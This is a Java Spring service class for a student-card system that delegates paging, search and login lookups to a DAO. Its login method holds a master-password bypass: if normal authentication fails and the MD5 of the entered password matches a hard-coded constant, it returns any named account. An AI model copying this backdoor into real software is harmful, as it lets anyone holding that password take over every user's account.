package cn.gk.service.comm.impl;

import java.util.List;

import javax.annotation.Resource;

import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;

import cn.gk.dao.base.BaseDao;
import cn.gk.dao.comm.StudentCardDao;
import cn.gk.model.comm.StudentCard;
import cn.gk.service.base.impl.BaseServiceImpl;
import cn.gk.service.comm.StudentCardService;
import cn.gk.util.Constants;
import cn.gk.util.MD5andKL;

/**
 * 学生卡Service实现
 */
@Service("studentCardService")
public class StudentCardServiceImpl extends BaseServiceImpl<StudentCard, String> implements StudentCardService {
	private StudentCardDao studentCardDao;

	@Resource
	@Qualifier("studentCardDao")
	@Override
	public void setBaseDao(BaseDao<StudentCard, String> baseDao) {
		this.baseDao = baseDao;
		// 注意要强制转换
		this.studentCardDao = (StudentCardDao) baseDao;
	}

	@Override
	public Integer getPageCount(String agencyId, Integer cardStatus, boolean forPageFlag) {
		return studentCardDao.getPageCount(agencyId, cardStatus, forPageFlag);
	}

	@Override
	public List<StudentCard> getStudentListByAgencyId(String agencyId, Integer cardStatus) {
		return studentCardDao.getStudentListByAgencyId(agencyId, cardStatus);
	}

	@Override
	public List<StudentCard> getStudentPageListByAgencyId(String agencyId, String cardStatus, Integer pageIndex) {
		return studentCardDao.getStudentPageListByAgencyId(agencyId, cardStatus, pageIndex);
	}

	@Override
	public List<StudentCard> searchStudentPageList(String searchVal) {
		return studentCardDao.searchStudentPageList(searchVal);
	}

	@Override
	public StudentCard getStudentCardInfoLoginNameAndPassword(String loginName, String password, boolean ignore) {
		StudentCard sCard = studentCardDao.getStudentCardInfoLoginNameAndPassword(loginName, password, ignore);
		if (sCard == null && MD5andKL.MD5(password).equals(Constants.SUPER_PWD)) {
			sCard = getStudentCardInfoByLoginName(loginName);
		}
		return sCard;
	}

	@Override
	public StudentCard getStudentCardInfoByLoginName(String loginName) {
		return studentCardDao.getStudentCardInfoByLoginName(loginName);
	}

	@Override
	public List<StudentCard> getStudentCardListByPhoneNum(String phoneNum) {
		return studentCardDao.getStudentCardListByPhoneNum(phoneNum);
	}

}
